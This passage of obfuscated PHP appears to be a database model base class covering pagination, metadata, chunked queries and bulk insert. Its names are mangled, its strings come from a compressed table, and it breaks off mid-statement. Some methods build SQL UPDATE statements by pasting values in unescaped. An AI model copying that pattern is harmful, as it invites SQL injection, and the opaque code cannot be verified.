$GLOBALS[$ºÁÇÀ[7]][$ºÁÇÀ[353]] = !1; } protected function selectPageRestore() { $€ÒÒº =& $_SERVER[Îûáû“ş]; if (!isset($GLOBALS[$€ÒÒº[362]])) { return; } $GLOBALS[$€ÒÒº[7]][$€ÒÒº[363]] = $GLOBALS[$€ÒÒº[362]]; $GLOBALS[$€ÒÒº[7]][$€ÒÒº[353]] = $GLOBALS[$€ÒÒº[364]]; if ($GLOBALS[$€ÒÒº[7]][$€ÒÒº[363]] === !1) { unset($GLOBALS[$€ÒÒº[7]][$€ÒÒº[363]]); } if ($GLOBALS[$€ÒÒº[7]][$€ÒÒº[353]] === !1) { unset($GLOBALS[$€ÒÒº[7]][$€ÒÒº[353]]); } unset($GLOBALS[$€ÒÒº[362]]); unset($GLOBALS[$€ÒÒº[364]]); } protected function selectPage($ÑÖÅğóå = 200, $Ñ„ÔÙÅ¸ = 1) { $‡ûŸ£û =& $_SERVER[Îûáû“ş]; global $in; $ËñÆ€‡¯ = $this->optionsValue(); $ãÉÖ˜³ = 50000; $ÑÖÅğóå = isset($in[$‡ûŸ£û[363]]) && $in[$‡ûŸ£û[363]] ? $in[$‡ûŸ£û[363]] : $ÑÖÅğóå; if ($ÑÖÅğóå === -1) { $in[$‡ûŸ£û[363]] = !1; $ãÉÖ˜³ = 100000000; $ÑÖÅğóå = $ãÉÖ˜³; } $íóë¬Ü¾ = $ËñÆ€‡¯; $íóë¬Ü¾[$‡ûŸ£û[365]] = array(); $ÑÖÅğóå = intval($ÑÖÅğóå); $ÑÖÅğóå = $ÑÖÅğóå <= 5 ? 5 : ($ÑÖÅğóå >= $ãÉÖ˜³ ? $ãÉÖ˜³ : $ÑÖÅğóå); $Ñ„ÔÙÅ¸ = intval(isset($in[$‡ûŸ£û[353]]) && $in[$‡ûŸ£û[353]] ? $in[$‡ûŸ£û[353]] : $Ñ„ÔÙÅ¸); $Ñ„ÔÙÅ¸ = $Ñ„ÔÙÅ¸ <= 1 ? 1 : $Ñ„ÔÙÅ¸; $î¹Ä¸Óà = array(); $çï‚ê = 1; if ($Ñ„ÔÙÅ¸ == 1 && $çï‚ê) { $this->optionsValue($ËñÆ€‡¯); $î¹Ä¸Óà = $this->page($Ñ„ÔÙÅ¸, $ÑÖÅğóå)->select(); $ö©ôşÏÌ = is_array($î¹Ä¸Óà) ? count($î¹Ä¸Óà) : 0; if ($ö©ôşÏÌ < $ÑÖÅğóå) { $‹óø­¥ø = 1; } else { $this->optionsValue($íóë¬Ü¾); $ö©ôşÏÌ = intval($this->count()); $‹óø­¥ø = ceil($ö©ôşÏÌ / $ÑÖÅğóå); } } else { $this->optionsValue($íóë¬Ü¾); $ö©ôşÏÌ = intval($this->count()); $‹óø­¥ø = ceil($ö©ôşÏÌ / $ÑÖÅğóå); $Ñ„ÔÙÅ¸ = $Ñ„ÔÙÅ¸ >= $‹óø­¥ø ? $‹óø­¥ø : $Ñ„ÔÙÅ¸; $this->optionsValue($ËñÆ€‡¯); $î¹Ä¸Óà = $this->page($Ñ„ÔÙÅ¸, $ÑÖÅğóå)->select(); } if (!is_array($î¹Ä¸Óà)) { $î¹Ä¸Óà = array(); } if ($‹óø­¥ø == 1) { $ö©ôşÏÌ = count($î¹Ä¸Óà); } $íõ›¢—İ = array($‡ûŸ£û[366] => array($‡ûŸ£û[367] => $ö©ôşÏÌ, $‡ûŸ£û[363] => $ÑÖÅğóå, $‡ûŸ£û[353] => $Ñ„ÔÙÅ¸, $‡ûŸ£û[368] => $‹óø­¥ø), $‡ûŸ£û[369] => $î¹Ä¸Óà); return $íõ›¢—İ; } protected function checkLength($ı¶Ç™Ñ”, $–é‰İô· = 0, $ê‹”‚ãô = '') { $ˆ„Íñ€ò =& $_SERVER[Îûáû“ş]; $–é‰İô· = $–é‰İô· ? $–é‰İô· : 65536; if (!$ı¶Ç™Ñ” || strlen($ı¶Ç™Ñ”) < $–é‰İô·) { return; } $ê‹”‚ãô = $ê‹”‚ãô ? $ê‹”‚ãô . $ˆ„Íñ€ò[71] : $ˆ„Íñ€ò[12]; show_json($ê‹”‚ãô . LNG($ˆ„Íñ€ò[370]) . "\50{$–é‰İô·}\51", !1); } protected function metaSet($¦ò‘È, $‚‰‰Æ”ò = null, $¡Ô‹ÏÜ§ = null) { $Öú–ªÔ =& $_SERVER[Îûáû“ş]; if (!$this->tableMeta || !$¦ò‘È) { return !1; } $¤í áŒ¼ = $this->tableMeta[$Öú–ªÔ[371]]; $¬¬µüĞ = $this->tableMeta[$Öú–ªÔ[372]]; $ĞıÀÄòì = Model($¬¬µüĞ); $ÑÔ¬Àì = array($¤í áŒ¼ => $¦ò‘È, $Öú–ªÔ[373] => $‚‰‰Æ”ò); if (is_null($‚‰‰Æ”ò)) { return $ĞıÀÄòì->where(array($¤í áŒ¼ => $¦ò‘È))->delete(); } if (is_null($¡Ô‹ÏÜ§) && is_string($‚‰‰Æ”ò)) { return $ĞıÀÄòì->where($ÑÔ¬Àì)->delete(); } $ä’Ûºéâ = is_array($‚‰‰Æ”ò) ? $‚‰‰Æ”ò : array(); if (is_string($‚‰‰Æ”ò)) { $ä’Ûºéâ[$‚‰‰Æ”ò] = $¡Ô‹ÏÜ§; } $ßèˆ’„· = array(); foreach ($ä’Ûºéâ as $ß¨ÁúŞ° => $ÖÓñ”û³) { if (is_null($ÖÓñ”û³) && is_string($ß¨ÁúŞ°)) { $ĞıÀÄòì->where(array($¤í áŒ¼ => $¦ò‘È, $Öú–ªÔ[373] => $ß¨ÁúŞ°))->delete(); continue; } $this->checkLength($ÖÓñ”û³, !1, $¬¬µüĞ . $Öú–ªÔ[4] . $ß¨ÁúŞ°); $ßèˆ’„·[] = array($¤í áŒ¼ => $¦ò‘È, $Öú–ªÔ[94] => $ß¨ÁúŞ°, $Öú–ªÔ[374] => $ÖÓñ”û³); } $©è†Å¢å = $Öú–ªÔ[375] . $¬¬µüĞ; CacheLock::lock($©è†Å¢å); $ĞıÀÄòì->where(array($¤í áŒ¼ => $¦ò‘È))->addAll($ßèˆ’„·, array(), !0); CacheLock::unlock($©è†Å¢å); return !0; } public function metaGet($Â©³Îø—, $»¥•Ì² = false) { $¹áæâ¨ =& $_SERVER[Îûáû“ş]; if (!$this->tableMeta) { return array(); } $Ìü–¾ÙÒ = $this->tableMeta[$¹áæâ¨[371]]; $•Öè¾Åê = Model($this->tableMeta[$¹áæâ¨[372]]); if ($»¥•Ì²) { $Æ÷Úµê = array($Ìü–¾ÙÒ => $Â©³Îø—, $¹áæâ¨[94] => $»¥•Ì²); return $•Öè¾Åê->where($Æ÷Úµê)->getField($¹áæâ¨[374]); } $Æ÷Úµê = array($Ìü–¾ÙÒ => $Â©³Îø—); $µ¶®òÜí = $•Öè¾Åê->field($¹áæâ¨[376])->where($Æ÷Úµê)->select(); $µ¶®òÜí = array_to_keyvalue($µ¶®òÜí, $¹áæâ¨[94], $¹áæâ¨[374]); return $µ¶®òÜí; } private function checkDataAutoHas($ÌíÇŒÒ¨) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¹§ˆ¦ÃÅ) { if (in_array($ÌíÇŒÒ¨, explode($_SERVER[Îûáû“ş][50], $¹§ˆ¦ÃÅ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$å›ó‰®ì, $ù€µø˜¼) { $Äñš‰õ =& $_SERVER[Îûáû“ş]; if (!is_array($å›ó‰®ì)) { return; } foreach ($this->dataAuto as $§©ê…¶Ÿ) { $¹üÓù¥ç = $§©ê…¶Ÿ[0]; if (!in_array($ù€µø˜¼, explode($Äñš‰õ[50], $§©ê…¶Ÿ[2]))) { continue; } switch (trim($§©ê…¶Ÿ[3])) { case $Äñš‰õ[321]: case $Äñš‰õ[322]: $„Ÿçâ×· = $§©ê…¶Ÿ[1]; $¹œ•Ô¿„ = isset($§©ê…¶Ÿ[4]) ? (array) $§©ê…¶Ÿ[4] : array(); if ($„Ÿçâ×· == $Äñš‰õ[180] && array_key_exists($¹üÓù¥ç, $å›ó‰®ì)) { if (!$å›ó‰®ì[$¹üÓù¥ç]) { unset($å›ó‰®ì[$¹üÓù¥ç]); } break; } if (isset($å›ó‰®ì[$¹üÓù¥ç])) { array_unshift($¹œ•Ô¿„, $å›ó‰®ì[$¹üÓù¥ç]); } if ($Äñš‰õ[321] == $§©ê…¶Ÿ[3]) { $å›ó‰®ì[$¹üÓù¥ç] = call_user_func_array($„Ÿçâ×·, $¹œ•Ô¿„); } else { $å›ó‰®ì[$¹üÓù¥ç] = call_user_func_array(array(&$this, $„Ÿçâ×·), $¹œ•Ô¿„); } break; case $Äñš‰õ[270]: if (isset($å›ó‰®ì[$¹üÓù¥ç]) && $å›ó‰®ì[$¹üÓù¥ç]) { $å›ó‰®ì[$¹üÓù¥ç] = call_user_func_array(array(&$this, $§©ê…¶Ÿ[1]), array($å›ó‰®ì[$¹üÓù¥ç])); } break; case $Äñš‰õ[273]: $å›ó‰®ì[$¹üÓù¥ç] = $å›ó‰®ì[$§©ê…¶Ÿ[1]]; break; case $Äñš‰õ[294]: if (isset($å›ó‰®ì[$¹üÓù¥ç]) && !is_string($å›ó‰®ì[$¹üÓù¥ç])) { $å›ó‰®ì[$¹üÓù¥ç] = json_encode_force($å›ó‰®ì[$¹üÓù¥ç]); } break; case $Äñš‰õ[323]: if ($å›ó‰®ì[$¹üÓù¥ç] === $Äñš‰õ[12]) { unset($å›ó‰®ì[$¹üÓù¥ç]); } break; case $Äñš‰õ[324]: $å›ó‰®ì[$¹üÓù¥ç] = $§©ê…¶Ÿ[1]; default: break; } } if ($ù€µø˜¼ == $Äñš‰õ[355]) { $¥ÂÄ¿Ñî = strtolower($this->db->getDbType()); if (strpos($¥ÂÄ¿Ñî, $Äñš‰õ[13]) !== 0) { return; } $õÖ–³³Ã = $this->field(!0)->fields; $ƒÍÕ˜±Ç = $õÖ–³³Ã[$Äñš‰õ[252]]; if (isset($õÖ–³³Ã[$Äñš‰õ[251]])) { unset($ƒÍÕ˜±Ç[$õÖ–³³Ã[$Äñš‰õ[251]]]); } foreach ($ƒÍÕ˜±Ç as $±¥ò³úß => $ù€µø˜¼) { if (!isset($å›ó‰®ì[$±¥ò³úß])) { $å›ó‰®ì[$±¥ò³úß] = $Äñš‰õ[12]; } } } } private function dataAfterFilter(&$ê¹òá”…) { $„üˆÑÑ =& $_SERVER[Îûáû“ş]; foreach ($this->dataAuto as $Š‘Õ‡ëÃ) { $Ø·äñ†Ó = $Š‘Õ‡ëÃ[0]; if (!isset($ê¹òá”…[$Ø·äñ†Ó])) { continue; } if (!in_array($„üˆÑÑ[357], explode($„üˆÑÑ[50], $Š‘Õ‡ëÃ[2]))) { continue; } switch (trim($Š‘Õ‡ëÃ[3])) { case $„üˆÑÑ[321]: case $„üˆÑÑ[322]: $¨»¶·ˆ® = isset($Š‘Õ‡ëÃ[4]) ? (array) $Š‘Õ‡ëÃ[4] : array(); array_unshift($¨»¶·ˆ®, $ê¹òá”…[$Ø·äñ†Ó]); if (isset($Š‘Õ‡ëÃ[4]) && $Š‘Õ‡ëÃ[4] == $„üˆÑÑ[377]) { $¨»¶·ˆ® = array($ê¹òá”…[$Ø·äñ†Ó]); } if ($„üˆÑÑ[321] == $Š‘Õ‡ëÃ[3]) { $ê¹òá”…[$Ø·äñ†Ó] = call_user_func_array($Š‘Õ‡ëÃ[1], $¨»¶·ˆ®); } else { $ê¹òá”…[$Ø·äñ†Ó] = call_user_func_array(array(&$this, $Š‘Õ‡ëÃ[1]), $¨»¶·ˆ®); } break; case $„üˆÑÑ[270]: if (isset($ê¹òá”…[$Ø·äñ†Ó]) && $ê¹òá”…[$Ø·äñ†Ó]) { $ê¹òá”…[$Ø·äñ†Ó] = call_user_func_array(array(&$this, $Š‘Õ‡ëÃ[1]), array($ê¹òá”…[$Ø·äñ†Ó])); } break; case $„üˆÑÑ[273]: $ê¹òá”…[$Ø·äñ†Ó] = $ê¹òá”…[$Š‘Õ‡ëÃ[1]]; break; case $„üˆÑÑ[294]: $¶ûĞÃÅı = $ê¹òá”…[$Ø·äñ†Ó]; $ê¹òá”…[$Ø·äñ†Ó] = json_decode($¶ûĞÃÅı, !0); if (is_null($ê¹òá”…[$Ø·äñ†Ó])) { $ê¹òá”…[$Ø·äñ†Ó] = $¶ûĞÃÅı; } break; case $„üˆÑÑ[323]: if ($ê¹òá”…[$Ø·äñ†Ó] === $„üˆÑÑ[12]) { unset($ê¹òá”…[$Ø·äñ†Ó]); } break; case $„üˆÑÑ[324]: $ê¹òá”…[$Ø·äñ†Ó] = $Š‘Õ‡ëÃ[1]; break; default: break; } } } public function saveAll($ïü¯Å«) { $ğÅØ°äß =& $_SERVER[Îûáû“ş]; $¹íÉÁÔ = $this->tablePrefix . $this->tableName; $ëê¹š‘ = self::SQL_WHERE_IN_CHUNK; $ïü¯Å« = is_array($ïü¯Å«) ? $ïü¯Å« : array(); $í†¹Œ–Ó = $ğÅØ°äß[378]; $™°ø¬¿è = 0; $à´’§Ì = array(); $§­˜ôßñ = count($ïü¯Å«); for ($…øŸ’ªÙ = 0; $…øŸ’ªÙ < $§­˜ôßñ; $…øŸ’ªÙ++) { $óºäİ¥ = $ïü¯Å«[$…øŸ’ªÙ]; if (!is_array($óºäİ¥) || count($óºäİ¥) != 4) { continue; } $… Ã Ìâ = "\x55\x50\104\101\124\105\x20\x60{$¹íÉÁÔ}\140\40\x53\x45\124\x20{$óºäİ¥[2]}\x20\x3d\40\103\x41\x53\105\40{$óºäİ¥[0]}\40\xa"; if ($™°ø¬¿è == 0) { $í†¹Œ–Ó = $… Ã Ìâ; } $à´’§Ì[] = $ğÅØ°äß[118] . $óºäİ¥[1] . $ğÅØ°äß[118]; $™°ø¬¿è++; $í†¹Œ–Ó .= "\x20\127\x48\x45\116\x20\x27{$óºäİ¥[1]}\47\x20\x54\x48\105\x4e\x20\x27{$óºäİ¥[3]}\47\x20\xa"; if ($™°ø¬¿è == $ëê¹š‘ || $…øŸ’ªÙ == $§­˜ôßñ - 1) { $ë¡³Ïœ = implode($ğÅØ°äß[50], $à´’§Ì); $í†¹Œ–Ó .= "\x20\x45\116\x44\x20\x20\x57\x48\105\x52\x45\x20{$óºäİ¥[0]}\x20\x49\116\40\50{$ë¡³Ïœ}\x29\x20"; $this->execute($í†¹Œ–Ó); $™°ø¬¿è = 0; $í†¹Œ–Ó = $… Ã Ìâ; $this->chunkEventCheck(count($à´’§Ì)); $à´’§Ì = array(); } } $this->chunkEventSet(); } public function saveAllEach($öˆßòœæ) { $Æø£ñ =& $_SERVER[Îûáû“ş]; $‘ó‹À‡û = $this->tablePrefix . $this->tableName; foreach ($öˆßòœæ as $×„ÇÊ±Ü) { if (!is_array($×„ÇÊ±Ü) || count($×„ÇÊ±Ü) != 4) { continue; } $«éÙ ƒ = $×„ÇÊ±Ü[0] . $Æø£ñ[379] . $×„ÇÊ±Ü[1] . $Æø£ñ[118]; $¦ÀÜûúó = $×„ÇÊ±Ü[2] . $Æø£ñ[379] . $×„ÇÊ±Ü[3] . $Æø£ñ[118]; $Â‰Ç¤„ = "\165\160\x64\141\x74\145\40{$‘ó‹À‡û}\x20\x73\145\164\40{$¦ÀÜûúó}\x20\167\150\145\162\x65\x20{$«éÙ ƒ}\73"; $this->execute($Â‰Ç¤„); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ó°’ğìó = false, $•Şº¤¯ö = false) { $this->_chunkEvent = $ó°’ğìó; $this->_chunkEventParam = $•Şº¤¯ö; } private function chunkEventCheck($¼ç¢ûÒ) { if (!$this->_chunkEvent) { return; } $Ê±ªÎò± = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ê±ªÎò±[$_SERVER[Îûáû“ş][380]] = $¼ç¢ûÒ; Hook::trigger($this->_chunkEvent, $Ê±ªÎò±); } public function addAll($æ¯Ïóšö, $êÜ–˜›Ì = array(), $Ò‰ä»Û = false) { $©€üâàé =& $_SERVER[Îûáû“ş]; ignore_timeout(); $ŸÀÓ‘Õ¯ = self::SQL_WHERE_IN_CHUNK; if (empty($æ¯Ïóšö)) { $this->error = think_lang($©€üâàé[271]); return !1; } $êÜ–˜›Ì = $this->_parseOptions($êÜ–˜›Ì); foreach ($æ¯Ïóšö as $Ïí¾œ°” => $óÛœğÑè) { $æ¯Ïóšö[$Ïí¾œ°”] = $this->_facade($óÛœğÑè); $this->_beforeInsert($æ¯Ïóšö[$Ïí¾œ°”], $êÜ–˜›Ì); } if (method_exists($this->db, $©€üâàé[272])) { for ($šö½êùÄ = 0; $šö½êùÄ < count($æ¯Ïóšö); $šö½êùÄ += $ŸÀÓ‘Õ¯) { $§ãâ˜Î = array_slice($æ¯Ïóšö, $šö½êùÄ, $ŸÀÓ‘Õ¯); if (!is_array($§ãâ˜Î) || count($§ãâ˜Î) == 0) { break; } $ö©Œ–© = $this->db->insertAll($§ãâ˜Î, $êÜ–˜›Ì, $Ò‰ä»Û); $this->chunkEventCheck(count($§ãâ˜Î)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($æ¯Ïóšö as $Ïí¾œ°” => $óÛœğÑè) { $ö©Œ–© = $this->db->insert($óÛœğÑè, $êÜ–˜›Ì, $Ò‰ä»Û); } $this->commit(); } if (!1 !== $ö©Œ–©) { $Û°”Êâ = $this->getLastInsID(); if ($Û°”Êâ) { return $Û°”Êâ; } } return $ö©Œ–©; } public function save($¨³ŸåÂ­ = '', $à©‡£¹ = array()) { $Ä€Æ’£ =& $_SERVER[Îûáû“ş]; $µ˜®áĞü = self::SQL_WHERE_IN_CHUNK; $ÛñÒÊ«İ = $this->optionsValue(); $“Ÿç”ğ = $this->findWhereField($ÛñÒÊ«İ); if (!$“Ÿç”ğ) { return parent::save($¨³ŸåÂ­, $à©‡£¹); } $­¼ÜÎœŸ = 0; $·íİ = $ÛñÒÊ«İ[$Ä€Æ’£[275]][$“Ÿç”ğ][1]; $·íİ = is_array($·íİ) ? $·íİ : array(); $äè«¹‰ = count($·íİ); for ($´ÀÛäª» = 0; $´ÀÛäª» < $äè«¹‰; $´ÀÛäª» += $µ˜®áĞü) { $¢—Á“Óæ = array_slice($·íİ, $´ÀÛäª», $µ˜®áĞü); if (!is_array($¢—Á“Óæ) || count($¢—Á“Óæ) == 0) { break; } $ÛñÒÊ«İ[$Ä€Æ’£[275]][$“Ÿç”ğ][1] = $¢—Á“Óæ; $this->optionsValue($ÛñÒÊ«İ); $­¼ÜÎœŸ += parent::save($¨³ŸåÂ­, $à©‡£¹); $this->chunkEventCheck(count($¢—Á“Óæ)); } $this->chunkEventSet(); return $­¼ÜÎœŸ; } public function add($£‘¦ˆ† = '', $’ˆæÇÚ« = array(), $ñĞ˜Î “ = false) { if ($this->addTaskStatus && is_array($£‘¦ˆ†)) { $this->addTaskData[] = $£‘¦ˆ†; return; } return parent::add($£‘¦ˆ†, $’ˆæÇÚ«, $ñĞ˜Î “); } public function parseWhereLike($èç‚¶ò­, $ŒÏ³Ó—å = '', $Œ…›Ô” = false, &$ˆ¾Öïşı = false) { $»îë¤†‰ =& $_SERVER[Îûáû“ş]; $”£ûÆ÷ñ = $GLOBALS[$»îë¤†‰[6]][$»îë¤†‰[381]]; if (!$”£ûÆ÷ñ[$»îë¤†‰[382]]) { return $èç‚¶ò­; } if (!is_array($èç‚¶ò­)) { return $èç‚¶ò­; } $±Ò¥éÊ• = array(); $ªß ûÍ = 0; foreach ($èç‚¶ò­ as $«×¢Á®Ô => $±§¶æïà) { if (is_array($±§¶æïà) && count($±§¶æïà) == 2 && $±§¶æïà[0] == $»îë¤†‰[383] && is_string($±§¶æïà[1]) && substr($±§¶æïà[1], 0, 1) == $»îë¤†‰[384] && substr($±§¶æïà[1], strlen($±§¶æïà[1]) - 1, 1) == $»îë¤†‰[384]) { $ˆ¾Öïşı = !0; $­¨ş–—Ç = is_string($«×¢Á®Ô) ? $«×¢Á®Ô : $ŒÏ³Ó—å; $Ë…€ùÕ = substr($±§¶æïà[1], 1, strlen($±§¶æïà[1]) - 2); $Ë…€ùÕ = $this->db->escapeString($Ë…€ùÕ); if (!strpos($­¨ş–—Ç, $»îë¤†‰[10])) { $­¨ş–—Ç = $»îë¤†‰[385] . $­¨ş–—Ç . $»îë¤†‰[385]; } $àõ÷øô¸ = $»îë¤†‰[189] . $Ë…€ùÕ . $»îë¤†‰[189]; $Ë…€ùÕ = str_replace(array($»îë¤†‰[10], $»îë¤†‰[386], $»îë¤†‰[11]), $»îë¤†‰[387], $Ë…€ùÕ); if ($”£ûÆ÷ñ[$»îë¤†‰[388]]) { $àõ÷øô¸ = $»îë¤†‰[389] . $Ë…€ùÕ . $»îë¤†‰[390]; if ($”£ûÆ÷ñ[$»îë¤†‰[391]]) { $àõ÷øô¸ = $»îë¤†‰[390] . $Ë…€ùÕ . $»îë¤†‰[389]; } } $±Ò¥éÊ•[$ªß ûÍ] = $»îë¤†‰[392] . $­¨ş–—Ç . $»îë¤†‰[393] . $àõ÷øô¸ . $»îë¤†‰[394]; $ªß ûÍ++; continue; } if (is_array($±§¶æïà)) { $ŒÏ³Ó—å = is_string($«×¢Á®Ô) ? $«×¢Á®Ô : $ŒÏ³Ó—å; $±§¶æïà = $this->parseWhereLike($±§¶æïà, $ŒÏ³Ó—å, !0, $ˆ¾Öïşı); } if (is_numeric($«×¢Á®Ô)) { $±Ò¥éÊ•[$ªß ûÍ] = $±§¶æïà; $ªß ûÍ++; } else { $±Ò¥éÊ•[$«×¢Á®Ô] = $±§¶æïà; } } if ($ˆ¾Öïşı && !$Œ…›Ô”) { } return $±Ò¥éÊ•; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($İµºùÙ = array()) { $‚éÑü¸ê =& $_SERVER[Îûáû“ş]; $©ÁœÎµÇ = self::SQL_WHERE_IN_CHUNK; $ÅüÓåËá = $this->optionsValue(); $‚äæè£È = $this->findWhereField($ÅüÓåËá); if (!$‚äæè£È || isset($ÅüÓåËá[$‚éÑü¸ê[292]]) || isset($ÅüÓåËá[$‚éÑü¸ê[353]])) { return parent::select($İµºùÙ); } $´‘Á›¼Š = $ÅüÓåËá[$‚éÑü¸ê[275]][$‚äæè£È][1]; $´‘Á›¼Š = is_array($´‘Á›¼Š) ? $´‘Á›¼Š : array(); $Ïé§‘µÛ = null; for ($Ì¡£ÈÙÖ = 0; $Ì¡£ÈÙÖ < count($´‘Á›¼Š); $Ì¡£ÈÙÖ += $©ÁœÎµÇ) { $¬¼î‰“Ã = array_slice($´‘Á›¼Š, $Ì¡£ÈÙÖ, $©ÁœÎµÇ); if (!is_array($¬¼î‰“Ã) || count($¬¼î‰“Ã) == 0) { break; } $ÅüÓåËá[$‚éÑü¸ê[275]][$‚äæè£È][1] = $¬¼î‰“Ã; $this->optionsValue($ÅüÓåËá); $ÎáúÃ°€ = parent::select($İµºùÙ); if (!$ÎáúÃ°€) { continue; } $Ïé§‘µÛ = is_array($Ïé§‘µÛ) ? $Ïé§‘µÛ : array(); $Ïé§‘µÛ = array_merge($Ïé§‘µÛ, $ÎáúÃ°€); } return $Ïé§‘µÛ; } public function delete($í®½äıå = array()) { $½éÅË¿ˆ =& $_SERVER[Îûáû“ş]; $şÀõÀÈÏ = self::SQL_WHERE_IN_CHUNK; $„ç©¸Íì = $this->optionsValue(); $Ä§Ø·÷ = $this->findWhereField($„ç©¸Íì); if (!$Ä§Ø·÷) { return parent::delete($í®½äıå); } $•Âú¦÷… = 0; $àˆ‚ÕÃ = $„ç©¸Íì[$½éÅË¿ˆ[275]][$Ä§Ø·÷][1]; $àˆ‚ÕÃ = is_array($àˆ‚ÕÃ) ? $àˆ‚ÕÃ : array(); for ($¬®Ä = 0; $¬®Ä < count($àˆ‚ÕÃ); $¬®Ä += $şÀõÀÈÏ) { $¦£ûŠİ˜ = array_slice($àˆ‚ÕÃ, $¬®Ä, $şÀõÀÈÏ); if (!is_array($¦£ûŠİ˜) || count($¦£ûŠİ˜) == 0) { break; } $„ç©¸Íì[$½éÅË¿ˆ[275]][$Ä§Ø·÷][1] = $¦£ûŠİ˜; $this->optionsValue($„ç©¸Íì); $•Âú¦÷… += parent::delete($í®½äıå); } return $•Âú¦÷…; } private function findWhereField($æ¡ÉÛ¬÷) { $İµëŞ½ =& $_SERVER[Îûáû“ş]; $Ë®·¸ë = self::SQL_WHERE_IN_CHUNK; if (!is_array($æ¡ÉÛ¬÷) || !is_array($æ¡ÉÛ¬÷[$İµëŞ½[275]])) { return !1; } foreach ($æ¡ÉÛ¬÷[$İµëŞ½[275]] as $• í¨ş‡ => $ıœûêÎ’) { if (is_array($ıœûêÎ’) && isset($ıœûêÎ’[0]) && is_string($ıœûêÎ’[0]) && strtolower($ıœûêÎ’[0]) == $İµëŞ½[7] && is_array($ıœûêÎ’[1]) && count($ıœûêÎ’[1]) > $Ë®·¸ë) { ignore_timeout(); return $• í¨ş‡; } } return !1; } public function setMasterDB($êœ÷Ì‰ = true) { think_config($_SERVER[Îûáû“ş][395], $êœ÷Ì‰); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\145\x6d\x4f\x70\x74\151\157\x6e"; public $field = array(); public function listData($ğ£üºì¿ = false, $Æäã›ş = "\x6d\x6f\x64\151\146\x79\x54\x69\155\145", $Ğû©¸­ = false) { $†ß×¾öÃ = Model($this->modelType)->get(!1, $this->optionType, !0); $–œá’›Ù = array_values($†ß×¾öÃ); if ($–œá’›Ù && $–œá’›Ù[0] && !is_array($–œá’›Ù[0])) { Model($this->modelType)->cacheRemove($this->optionType); $†ß×¾öÃ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$†ß×¾öÃ) { return $ğ£üºì¿ ? null : array(); } if (!$ğ£üºì¿) { $†ß×¾öÃ = array_filter(array_values($†ß×¾öÃ)); return array_sort_by($†ß×¾öÃ, $Æäã›ş, $Ğû©¸­); } return $†ß×¾öÃ[$_SERVER[Îûáû“ş][396] . $ğ£üºì¿]; } public function insert($²³İá—Ô) { $èçî°ã¸ =& $_SERVER[Îûáû“ş]; $²³İá—Ô = array_field_key($²³İá—Ô, $this->field); $‹­“Ö¨ = Model($this->modelType)->get($èçî°ã¸[397], $this->optionType . $èçî°ã¸[398]); $‹­“Ö¨ = $‹­“Ö¨ ? $‹­“Ö¨ : 0; $²³İá—Ô[$èçî°ã¸[399]] = ++$‹­“Ö¨; $²³İá—Ô[$èçî°ã¸[201]] = time(); $²³İá—Ô[$èçî°ã¸[85]] = time(); Model($this->modelType)->set($èçî°ã¸[397], $‹­“Ö¨, $this->optionType . $èçî°ã¸[398]); Model($this->modelType)->set($èçî°ã¸[396] . $‹­“Ö¨, $²³İá—Ô, $this->optionType); return $‹­“Ö¨; } public function update($²ÃÜ©ã“, $›²Şí) { $ÎĞÍ–‡ =& $_SERVER[Îûáû“ş]; $›²Şí = array_field_key($›²Şí, $this->field); $²Êì÷¿ö = $this->listData($²ÃÜ©ã“); if (!$²Êì÷¿ö || !$²ÃÜ©ã“) { return !1; } $›²Şí = array_merge($²Êì÷¿ö, $›²Şí); $›²Şí[$ÎĞÍ–‡[85]] = time(); return Model($this->modelType)->set($ÎĞÍ–‡[396] . $²ÃÜ©ã“, $›²Şí, $this->optionType); } public function remove($¹“—âèŞ) { if (!$¹“—âèŞ) { return !1; } return Model($this->modelType)->remove($_SERVER[Îûáû“ş][396] . $¹“—âèŞ, $this->optionType); } public function clear() { $úúØ¡¥Î =& $_SERVER[Îûáû“ş]; Model($this->modelType)->remove($úúØ¡¥Î[397], $this->optionType . $úúØ¡¥Î[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($“ËàØäº, $ô¨æ¸ıõ) { if (!$ô¨æ¸ıõ) { return !1; } $áÖôˆõ¼ = $this->listData(); $áÖôˆõ¼ = array_to_keyvalue($áÖôˆõ¼, $“ËàØäº); return isset($áÖôˆõ¼[$ô¨æ¸ıõ]) ? $áÖôˆõ¼[$ô¨æ¸ıõ] : !1; } public function findByName($€ÚÛæ‰) { return $this->findByKey($_SERVER[Îûáû“ş][32], $€ÚÛæ‰); } protected function resetData($µú‡¹ì) { $Öï¶êë¦ =& $_SERVER[Îûáû“ş]; $µú‡¹ì = is_array($µú‡¹ì) ? $µú‡¹ì : array(); $­¬æ‹şğ = array(); for ($±À„‚˜Î = 0; $±À„‚˜Î < count($µú‡¹ì); $±À„‚˜Î++) { $­¬æ‹şğ[$Öï¶êë¦[396] . $µú‡¹ì[$±À„‚˜Î][$Öï¶êë¦[399]]] = $µú‡¹ì[$±À„‚˜Î]; } return Model($this->modelType)->set($­¬æ‹şğ, !1, $this->optionType); } private function getAutoName($«Ù»™ï) { $ìÔí¤Ü• = array_to_keyvalue($this->listData(), $_SERVER[Îûáû“ş][32]); if (!$ìÔí¤Ü• || !isset($ìÔí¤Ü•[$«Ù»™ï])) { return $«Ù»™ï; } for ($ÛõÉÃóá = 1; $ÛõÉÃóá < count($ìÔí¤Ü•); $ÛõÉÃóá++) { $§ë¼Áïé = $«Ù»™ï . "\50{$ÛõÉÃóá}\x29"; if (!isset($ìÔí¤Ü•[$§ë¼Áïé])) { return $§ë¼Áïé; } } return $§ë¼Áïé; } } goto aÌ­¼ ¶‘›; f¦§Çíùç»: $_SERVER[üÌ¬Ôµ] = explode($_SERVER[Îûáû“ş][608], gzinflate(substr($_SERVER[Îûáû“ş][609], 10, -8))); $spldjavyqw = $_SERVER[Îûáû“ş][610]; if 